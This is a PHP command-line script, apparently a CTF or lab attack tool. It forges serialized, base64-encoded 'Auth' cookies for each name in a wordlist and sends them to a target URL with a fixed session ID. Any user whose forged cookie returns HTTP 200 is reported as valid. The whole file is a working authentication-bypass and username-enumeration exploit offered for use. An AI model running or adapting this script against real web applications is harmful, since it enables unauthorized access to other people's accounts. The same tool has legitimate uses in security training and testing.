<?php

$colorAzulCyan = "\033[34m"; // Azul cyan
$colorNaranja = "\033[38;5;208m"; // Naranja
$colorRojo= "\033[31m";
$colorAmarillo = "\033[38;5;220m";
$colorReset = "\033[0m"; // Restablecer color
$colorBlue = "\033[38;5;18m";
$colorVioleta = "\033[38;5;129m";

function imprimirBannerAscii() {
    $colorAzulCyan = "\033[34m"; // Azul cyan
    $colorNaranja = "\033[38;5;208m"; // Naranja
    $colorRojo= "\033[31m";
    $colorAmarillo = "\033[38;5;220m";
    $colorReset = "\033[0m"; // Restablecer color
    $colorBlue = "\033[38;5;18m";
    $colorVioleta = "\033[38;5;129m";

    echo "\t\t\t{$colorVioleta} ⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⢀⣀⣤⠀⠀⠀⠀⢀⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⡾⠿⠟⠛⣿⣆⡄⠀⢀⡈⠙⠻⢷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠛⠋⢉⣀⣤⣴⣶⡿⠿⢿⣷⢀⣾⡟⠀⠀⠀⠈⠙⠻⢷⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠀⠀⣤⣀⠀⠀⠀⣶⠿⠟⠛⠉⣉⣀⣤⣴⣾⠿⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠀⠀⠉⠻⣿⣦⣄⣠⣤⣶⡾⠿⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠀⠀⢀⣼⡟⠉⠙⠻⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣟⠀⠐⣾⡄⢀⣤⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠀⢀⣾⠏{$colorReset}{$colorAmarillo}⠀⠀⠀⠀⠀⠀⠀⢀⠀⢀⣠⠊⠀⠀⠈⠳⣄⠀⠢⡀⠀⠀⠀{$colorReset}{$colorVioleta}⠈⢿⣧⠀⠘⣿⣌⢿⣧⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⢀⠀⠀⢠⣾⠏{$colorReset}{$colorAmarillo}⠀⠀⠀⠀⠀⠠⠀⣰⠏⣰⢿⠃⠀⠀⠀⠀⠀⢹⣷⣄⢳⡄⠀⡀{$colorReset}{$colorVioleta}⠀⠈⢿⣷⣾⠿⣿⡌⢿⠇⠀⠀⠀\n";
    echo "\t\t\t⠀⠛⠃⣠⣿⡋⠀{$colorReset}{$colorNaranja}⠀⠀⠀⠀⢠⣿⣼⢿⣾⢣⡏⡀⠀⠀⠀⠀⠀⡀⢷⢹⣾⣿⣄⣷⡀⠀{$colorReset}{$colorVioleta}⠈⢿⣆⠀⠹⣿⡄⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠈⠙⠻⢷{$colorReset}{$colorAmarillo}⠂⠀⢰⠀⣾⢯⣟⣿⠆⣼⡰⠁⠀⠀⠀⠀⠀⠘⣼⡇⢻⢾⣽⣳⡇⢀{$colorReset}{$colorVioleta}⠀⠈⢿⣆⠀⠉⠁⠀⠀⠀⠀\n";
    echo "\t\t\t⣤⣴⣶⣾⡆⠀⠀{$colorReset}{$colorNaranja}⠀⠀⣸⢆⢫⣟⣾⠹⠀⡿⠇⠀⠀⠀⠀⠀⠀⠀⢹⢷⠸⢻⣞⣻⢆⣼⡇{$colorReset}{$colorVioleta}⠀⠘⠻⠿⣷⣆⣀⣀⠀⠀\n";
    echo "\t\t\t⢸⣿⠀⢹⣷⠀⠀{$colorReset}{$colorNaranja}⠀⠀⢹⣏⢿⣚⡟⠆⢐⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠆⠘⡽⣝⡿⣹⡇⠀{$colorReset}{$colorVioleta}⠀⠀⢠⣿⠛⠛⠛⠀\t\t\t [*] {$colorReset}{$colorVioleta} Developed By - Juan Duque⠀{$colorReset}{$colorVioleta}\n";
    echo "\t\t\t⠀⣿⡇⠈⣿⡆⠀{$colorReset}{$colorNaranja}⠀⠀⠸⣎⢯⠳⡽⡀⠘⡽⡄{$colorReset}{$colorRojo}⠀⠐⢲⢲⡤{$colorReset}{$colorNaranja}⠄⠀⣸⠳⠀⢰⡝⣧⠻⣵{$colorReset}{$colorVioleta}⠀⠀⠀⠀⣼⡟⠀⠀⠀{$colorReset}{$colorAzulCyan}⠀\t\t\t\t\t@Dkb4rb{$colorReset}{$colorAzulCyan}    ⠀\n";
    echo "\t\t\t⠀⢸⣿⠀⢻⣧⠀{$colorReset}{$colorNaranja}⠀⠀⠀⠩⢮⡹⣙⣝⠄⠱⡳⡀{$colorReset}{$colorRojo}⠀⣘⠳⡖{$colorReset}{$colorNaranja}⠀⡠⡽⠁⠔⣫⢫⡞⣹⠂{$colorReset}{$colorVioleta}⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⣿⡇⠘⣿⣄⣀⣠{$colorReset}{$colorRojo}⠀⠀⠑⢥⢉⢇⣓⠥⣲⢩⡆⢍⠣⢥⣂⡳⣓⠥⣊⠟⡡⡬⠃⠀{$colorReset}{$colorVioleta}⢠⣀⣀⣸⣿⣀⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⢸⡷⠀⠻⠛⠛⠉{$colorReset}{$colorRojo}⠀⠀⠀⠀⠙⠣⢉⢖⠖⣩⡿⠌⡑⢢⢸⢅⠲⣎⡭⠞⠉⠀{$colorReset}{$colorVioleta}⠀⠀⠈⠛⠛⠿⠋⠻⢷⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⣄⠀⠀⠀⠀⠀⠉{$colorReset}{$colorRojo}⠀⠀⠀⠀⠀⠀⠀⠈⠙⠢⣾⠈⡐⠰⢂⠟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀{$colorReset}{$colorVioleta}⠀⢀⣄⠀⠀\n";
    echo "\t\t\t⠀⢠⣄⠙⢷⣤⡀⠀⠀⠀{$colorReset}{$colorRojo}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡄⠀⠸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀{$colorReset}{$colorVioleta}⠀⠀⣀⣴⠟⢻⣦⠀⠀\n";
    echo "\t\t\t⢴⣦⡙⠻⣦⡉⠻⣦⣀⠀{$colorReset}{$colorRojo}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢀⠃⠀⠀⠀⠀⠀⠀⠀⠀{$colorReset}{$colorVioleta}⠀⠀⠀⢀⣾⠋⣡⣾⣿⣥⣶⠆\n";
    echo "\t\t\t⠀⠈⠻⣦⣌⠻⢷⣌⠙⠷⣦⣤⣀⡀⠀⠀{$colorReset}{$colorRojo}⠀⠀⠀⠀⠀⡎⠀⠀⠀{$colorReset}{$colorVioleta}⠀⠀⠀⠀⠀⢀⣠⣤⡆⠛⢋⣴⡾⠋⠉⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠙⢷⣼⠟⠡⢶⣤⣍⣙⠛⠷⢶⣤⢀⡀⠀{$colorReset}{$colorRojo}⠀⠃{$colorReset}{$colorVioleta}⠀⠀⠀⠀⣤⣴⠶⠟⠛⣉⣭⣿⣦⠙⢷⣄⠀⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠀⠀⠉⠀⠶⣦⣤⣉⡛⠻⠷⣾⣧⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⣤⡶⠾⠛⣋⣩⣤⡿⠆⠈⠁⠀⠀⠀⠀⠀⠀\n";
    echo "\t\t\t⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⢶⣾⠇⢸⣇⣀⣀⣀⣀⣀⣀⣀⠀⢠⣴⠶⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n";
    echo "{$colorReset}"; // Restablecer color
}

function leerUsuarios($archivo) {
    if (file_exists($archivo) && is_readable($archivo)) {
        $usuarios = file($archivo, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        return $usuarios;
    } else {
        die("Error: No se puede leer el archivo de usuarios.");
    }
}

function generarCookie($id, $username) {
    $user_data = array(
        'id' => $id,
        'username' => $username,
        'expires' => time() + (60 * 60 * 24) // Tiempo de expiración de 1 día
    );

    $cookie_value = serialize($user_data);

    $encoded_cookie_value = base64_encode($cookie_value);

    return urlencode($encoded_cookie_value);

}

function generarCookieNoencode($id, $username) {
     $user_data = array(
         'id' => $id,
         'username' => $username,
         'expires' => time() + (60 * 60 * 24) // Tiempo de expiración de 1 día
     );

     $cookie_value = serialize($user_data);

     return $cookie_value;

 }


if ($argc != 3) {
    echo "\n\t\t   [{$colorNaranja}    {$colorReset} ] {$colorBlue} Uso: {$colorReset} {$colorNaranja} php script.php <URL> <archivo_wordlist> {$colorReset}\n";
    exit(1);
}

$url = $argv[1];

$archivo_usuarios = $argv[2];

$nombres_usuarios = leerUsuarios($archivo_usuarios);

$cookies = "PHPSESSID=ne7chj1pir2fbc5pjdmurohnc3";

$opts = array(
    'http' => array(
        'method' => 'GET',
        'header' => "Cookie: $cookies\r\n"
    )
);

$context = stream_context_create($opts);

$found_users = array();

function print_users(){

global $found_users;

echo "{$colorVioleta}{$colorReset}\n";

 foreach ($found_users as $usuario) {
        foreach ($usuario as $key => $value) {
            echo "{$colorVioleta}[  ]{$colorReset} -- \033[32m$key: $value{$colorReset}\n";
        }
        echo "\n";
 }
echo "{$colorVioleta}{$colorReset}\n";
}

foreach ($nombres_usuarios as $nombre_usuario) {
     imprimirBannerAscii();

    if (!empty($found_users)) {
 	   print_users();
    }

    $cookie_value = generarCookie(5, $nombre_usuario);

    $opts['http']['header'] = "Cookie: PHPSESSID=ne7chj1pir2fbc5pjdmurohnc3; Auth=$cookie_value\r\n";

    $context = stream_context_create($opts);

    echo "\033[2K\r";
    echo "{$colorRojo}Probando usuario: {$colorNaranja}$nombre_usuario (Base64: $cookie_value, Serializado: " . generarCookie(5, $nombre_usuario) . "){$colorReset}";

    $resultado = file_get_contents($url, false, $context);
    $headers = $http_response_header;
  
    $lastResponse = $headers[0];
    if (strpos($lastResponse, '200 OK') !== false) {
        echo "\n\033[32m¡Cookie válida para el usuario $nombre_usuario!\033[0m\n";
        array_push($found_users, array($nombre_usuario, $cookie_value, generarCookieNoencode(5, $nombre_usuario) ) );
        system('clear');
        flush();
        continue;
    }
    system('clear');
    flush();

}
?>
